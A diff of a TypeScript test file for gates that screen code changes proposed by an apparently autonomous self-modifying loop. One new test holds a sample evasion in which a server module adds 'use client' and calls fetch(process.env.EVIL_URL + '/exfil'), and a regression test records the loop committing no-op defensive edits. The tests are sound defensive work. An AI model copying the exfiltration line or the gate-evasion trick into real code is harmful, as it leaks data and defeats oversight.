@@ -48,16 +48,16 @@ describe("detectConvergentMove", () => {
 
   // ── Condition 2: predominantly additive ──────────────────────────
 
-  test("returns not-convergent when added < 3 (too few additions)", () => {
+  test("returns not-convergent when net guard increase < 2 (single guard is a judgment call, not a pattern)", () => {
     const original = "function f() { return 1; }";
     const evolved = "function f() { return 1; }\nif (!x) return;";
-    // 1 added guard line, 0 removed
+    // 1 added guard line. Net guard increase = 1 < 2 → not convergent.
     const r = detectConvergentMove(original, evolved);
     expect(r.convergent).toBe(false);
-    expect(r.reason).toMatch(/too few additions/);
+    expect(r.reason).toMatch(/net guard-lexicon increase 1 < 2/);
   });
 
-  test("returns not-convergent when removed > 2 (real refactor)", () => {
+  test("returns not-convergent when removed lines contain behavioral signal (real refactor, not convergent)", () => {
     const original = [
       "function f() { return 1; }",
       "function g() { return 2; }",
@@ -70,16 +70,18 @@ describe("detectConvergentMove", () => {
       "if (!y) return;",
       "if (!z) return;",
     ].join("\n");
-    // 3 added guards, 3 removed functions → real refactor
+    // 3 added guards, 3 removed functions. Net guard increase = 3 >= 2,
+    // BUT the removed lines contain `function` (behavioral signal) →
+    // real refactor, not convergent. (The redesign's (3b) check.)
     const r = detectConvergentMove(original, evolved);
     expect(r.convergent).toBe(false);
-    expect(r.reason).toMatch(/has removals/);
+    expect(r.reason).toMatch(/removes behavioral signal/);
   });
 
-  // ── Condition 3: guard lexicon density ────────────────────────────
+  // ── Condition 2: net guard-lexicon increase ────────────────────────
 
-  test("returns not-convergent when additions are not guard-dominated", () => {
-    // 3 added lines of real logic, 1 guard → 25% density < 50%.
+  test("returns not-convergent when additions are not guard-dominated (net increase < 2)", () => {
+    // 3 added lines of real logic, 1 guard → net guard increase = 1 < 2.
     const original = "function f() { return 1; }";
     const evolved = [
       "function f() { return 1; }",
@@ -90,7 +92,7 @@ describe("detectConvergentMove", () => {
     ].join("\n");
     const r = detectConvergentMove(original, evolved);
     expect(r.convergent).toBe(false);
-    expect(r.reason).toMatch(/not guard-dominated/);
+    expect(r.reason).toMatch(/net guard-lexicon increase 1 < 2/);
   });
   // ── Condition 4: behavioral signal escape hatch ──────────────────
 
@@ -341,7 +343,7 @@ describe("detectConvergentMove", () => {
 
   // ── CLIENT-COMPONENT FETCH EXEMPTION (audit 8) ────────────────────
 
-  test("triage EXEMPTS fetch( for client components (use client directive present)", () => {
+  test("triage EXEMPTS fetch( for client components (original also had use client)", () => {
     // A new client panel that calls fetch("/api/...") — the standard
     // React pattern for calling app routes. The guard must NOT flag
     // the new fetch( as a dangerous token when "use client" is present.
@@ -389,7 +391,7 @@ describe("detectConvergentMove", () => {
     expect(r.reasons.some((x) => x.includes("eval("))).toBe(true);
   });
 
-  test("gateMutation ALLOWS a new client component that uses fetch(", () => {
+  test("gateMutation ALLOWS a new client component that uses fetch( (original empty = new file)", () => {
     // The end-to-end path: a brand-new client panel (created action,
     // original is empty) that uses fetch. gateMutation should allow
     // it through to the debate tribunal / typecheck gate.
@@ -403,5 +405,50 @@ describe("detectConvergentMove", () => {
     // passes (not a protected path, not empty, NOT a convergent move —
     // the diff adds a new export, which is a behavioral signal).
     expect(r.allowed).toBe(true);
+  });
+
+  // ── REGRESSION: defensive modifications to existing lines (audit 8) ──
+  // The loop committed convergent no-ops on oracle-task-feed.ts by adding
+  // ?. and ?? "N/A" to EXISTING lines (Prisma fields that are guaranteed
+  // non-null). The old heuristic's "removed > 2 = real refactor" missed
+  // this because each modified line counts as 1 removed + 1 added. The
+  // redesign catches it via NET guard-lexicon increase.
+
+  test("flags defensive modifications to existing lines (the oracle-task-feed.ts regression)", () => {
+    // Exact pattern from commit 36dce4d on oracle-task-feed.ts: 3 lines
+    // modified to add ?? "N/A" to non-null Prisma fields.
+    const original = [
+      '    `Confidence when made: ${prophecy.confidence.toFixed(2)}. ` +',
+      '    `Made at ${prophecy.createdAt.toISOString()}, deadline ${prophecy.evaluateBy.toISOString()}. ` +',
+      '    `Criterion: ${prophecy.falsifiabilityCriterion}`',
+    ].join("\n");
+    const evolved = [
+      '    `Confidence when made: ${prophecy.confidence?.toFixed(2) ?? "N/A"}. ` +',
+      '    `Made at ${prophecy.createdAt?.toISOString() ?? "N/A"}, deadline ${prophecy.evaluateBy?.toISOString() ?? "N/A"}. ` +',
+      '    `Criterion: ${prophecy.falsifiabilityCriterion ?? "N/A"}`',
+    ].join("\n");
+    // 3 lines modified (3 removed, 3 added). Each added line has `?? "N/A"`
+    // matching the nullish-coalescing lexicon. Net guard increase = 3 >= 2.
+    // No behavioral signal (no new exports/functions). → convergent.
+    const r = detectConvergentMove(original, evolved);
+    expect(r.convergent).toBe(true);
+  });
+
+  // ── BYPASS DEFENSE: server module can't fake "use client" (audit 8) ──
+
+  test("triage STILL BLOCKS fetch( when a server module ADDS 'use client' to get the exemption", () => {
+    // A server module that adds "use client" at the top + fetch(evilUrl).
+    // The exemption requires the ORIGINAL to also have "use client" (or
+    // be a new file). A mutation that ADDS "use client" to a server module
+    // does NOT get the exemption — the fetch is still flagged.
+    const original = 'import { db } from "@/lib/db";\nexport function f() { return db.query(); }\n';
+    const evolved = '"use client";\nimport { db } from "@/lib/db";\nexport function f() {\n  return fetch(process.env.EVIL_URL + "/exfil");\n}\n';
+    const r = triageProposal({
+      filePath: "src/lib/pipeline/autonomous/evil.ts",
+      originalCode: original,
+      evolvedCode: evolved,
+    });
+    expect(r.verdict).toBe("evil");
+    expect(r.reasons.some((x) => x.includes("fetch("))).toBe(true);
   });
 });
